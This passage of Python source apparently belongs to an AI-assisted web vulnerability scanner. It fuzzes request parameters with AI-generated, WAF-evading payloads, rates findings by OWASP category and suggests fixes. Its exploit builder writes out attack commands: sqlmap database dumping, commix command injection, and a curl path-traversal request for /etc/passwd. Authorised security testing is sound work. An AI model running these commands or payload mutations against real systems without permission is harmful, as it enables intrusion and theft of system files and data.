            owasp_id="A05", owasp_name="Security Misconfiguration",
            title=f"Missing security headers ({len(missing)}): {ep.url}",
            risk="Medium", confidence=90, url=ep.url, method="GET",
            param="HTTP_HEADERS", payload="", evidence="; ".join(missing[:4]),
            baseline_diff="", tool_output="", request_raw=f"GET {ep.url}",
            response_raw="", exploit_cmd="", remediation="Add missing security headers.",
            tool="header_check",
        )]

    def _get_payloads(self, vuln_type: str, ep: Endpoint) -> list:
        if hasattr(self.ai, "generate_payloads"):
            try:
                generated = self.ai.generate_payloads(vuln_type, {"tech": self.ctx.site_tech, "url": ep.url, "param": ""})
                if generated:
                    mutator = PayloadMutator(self.waf_name)
                    variants: List[str] = []
                    for payload in generated[:5]:
                        variants.extend(mutator.mutate(payload, max_variants=4))
                    return list(dict.fromkeys(variants))[:20]
            except Exception:
                pass
        return get_payloads(vuln_type, waf_name=self.waf_name, max_variants=20)

    def _fuzz_request(self, ep: Endpoint, param_key: str, payload: str) -> dict:
        params = dict(ep.params)
        params[param_key] = payload
        pname = param_key.split(":")[-1]
        if param_key.startswith("header:"):
            return self.client.get(ep.url, extra_headers={pname: payload})
        if ep.method == "GET":
            parsed = urllib.parse.urlparse(ep.url)
            query = dict(urllib.parse.parse_qsl(parsed.query))
            query[pname] = payload
            url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(query)))
            return self.client.get(url)
        clean = {k.split(":")[-1]: v for k, v in params.items() if not k.startswith(("header:", "path:"))}
        if ep.body_type == "json":
            return self.client.post(ep.url, json_data=clean)
        return self.client.post(ep.url, data=clean)

    @staticmethod
    def _extract_title(body: str) -> str:
        match = re.search(r"<title[^>]*>(.*?)</title>", body, re.I | re.S)
        return match.group(1).strip()[:100] if match else ""

    @staticmethod
    def _extract_errors(body: str) -> list:
        found = []
        for pattern in (r"(exception|traceback|fatal error)", r"SQL syntax|ORA-\d+"):
            for match in re.finditer(pattern, body, re.I):
                found.append(match.group()[:50])
        return list(set(found))[:10]

    @staticmethod
    def _build_req(ep: Endpoint, param_key: str, payload: str) -> str:
        pname = param_key.split(":")[-1]
        if ep.method == "GET":
            return f"GET {ep.url}?{pname}={urllib.parse.quote(payload)} HTTP/1.1"
        return f"POST {ep.url}\n\n{pname}={urllib.parse.quote(payload)}"

    @staticmethod
    def _build_exploit(vuln_type: str, ep: Endpoint, param: str, payload: str) -> str:
        pname = param.split(":")[-1]
        if vuln_type == "sqli":
            return f"sqlmap -u '{ep.url}' -p '{pname}' --batch --dbs"
        if vuln_type == "xss":
            return f"dalfox url '{ep.url}' --param {pname}"
        if vuln_type == "lfi":
            return f"curl '{ep.url}?{pname}=../../../../etc/passwd'"
        if vuln_type == "cmdi":
            return f"commix --url='{ep.url}' -p {pname}"
        return f"curl '{ep.url}?{pname}={urllib.parse.quote(payload)}'"

    @staticmethod
    def _owasp_id(vuln_type: str) -> str:
        return {"sqli": "A03", "xss": "A03", "lfi": "A03", "ssti": "A03", "cmdi": "A03", "ssrf": "A10", "idor": "A01", "nosqli": "A03", "xxe": "A03", "crlf": "A03", "prototype": "A08"}.get(vuln_type, "A03")

    @staticmethod
    def _owasp_name(vuln_type: str) -> str:
        return {"sqli": "Injection", "xss": "Injection", "lfi": "Injection", "ssti": "Injection", "cmdi": "Injection", "ssrf": "SSRF", "idor": "Broken Access Control", "nosqli": "Injection", "xxe": "Injection", "crlf": "Injection", "prototype": "Software Integrity Failures"}.get(vuln_type, "Injection")

    @staticmethod
    def _risk(vuln_type: str, confidence: int) -> str:
        if confidence >= 85:
            return {"sqli": "Critical", "cmdi": "Critical", "ssrf": "High", "lfi": "High", "ssti": "Critical"}.get(vuln_type, "High")
        if confidence >= 60:
            return "Medium"
        return "Low"

    @staticmethod
    def _remediation(vuln_type: str) -> str:
        return {
            "sqli": "Use parameterized queries / prepared statements.",
            "xss": "Encode output. Use Content-Security-Policy.",
            "lfi": "Validate file paths. Use allowlist. Disable path traversal.",
            "ssti": "Use sandboxed template engines. Never pass user input to templates.",
            "cmdi": "Use subprocess with argument list, never shell=True.",
            "ssrf": "Validate and whitelist allowed URLs. Block internal IPs.",
            "idor": "Verify object ownership server-side before returning data.",
            "nosqli": "Sanitize all operator keys. Use allowlist for accepted fields.",
            "xxe": "Disable external entity processing in XML parser.",
            "crlf": "Strip CR/LF from all inputs used in HTTP headers.",
            "prototype": "Freeze Object.prototype. Use Map instead of plain objects.",
        }.get(vuln_type, "Sanitize and validate all user input.")

    @staticmethod
    def _print_finding(finding: Finding):
        color = {"Critical": "\033[1;31m", "High": "\033[0;31m", "Medium": "\033[0;33m", "Low": "\033[0;36m"}.get(finding.risk, "\033[0m")
        print(f"  {color}[{finding.risk}]\033[0m {finding.owasp_id} - {finding.title} (conf:{finding.confidence}% {'OK' if finding.confirmed else '?'})")


def main():
    parser = build_arg_parser()
    args = parser.parse_args()

    if args.model:
        global MODEL_NAME
        MODEL_NAME = args.model

    if args.tools:
        PentestPipeline._print_tools_status()
        return

    if getattr(args, "advisor", False):
        # Faqat KB advisor rejimi — scan qilmasdan
        ai = AIEngine()
        kb = KnowledgeBase(ai)
        console.print(BANNER)
        console.print(f"\n[bold cyan]━━ KB ADVISOR MODE ━━[/bold cyan]")
        target = getattr(args, "target", "")
        scan_id = input("Scan ID (bo'sh qoldirsa hammasi): ").strip()
        kb.chat(scan_id=scan_id, target=target)
        kb.save()
        return

    signal.signal(signal.SIGINT, lambda s, f: (
        console.print("\n[yellow]Interrupted.[/yellow]"), sys.exit(0)
    ))

    PentestPipeline(args).run()


if __name__ == "__main__":
    main()
